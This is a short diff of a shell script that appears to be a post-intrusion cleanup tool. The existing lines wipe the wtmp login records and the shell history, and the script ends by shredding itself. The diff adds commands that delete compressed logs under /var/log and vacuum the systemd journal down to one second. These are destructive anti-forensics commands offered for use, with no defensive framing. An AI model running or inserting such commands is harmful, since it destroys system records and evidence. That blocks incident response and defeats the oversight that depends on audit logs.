@@ -87,6 +87,9 @@ echo "[13] Clear logs..."
 echo > /var/log/wtmp
 rm -f ~/.bash_history
 history -c
+find /var/log -type f -name "*.gz" -delete
+journalctl --rotate
+journalctl --vacuum-time=1s
 
 echo "[14] Done. Self-destructing..."
 shred -u "$0"
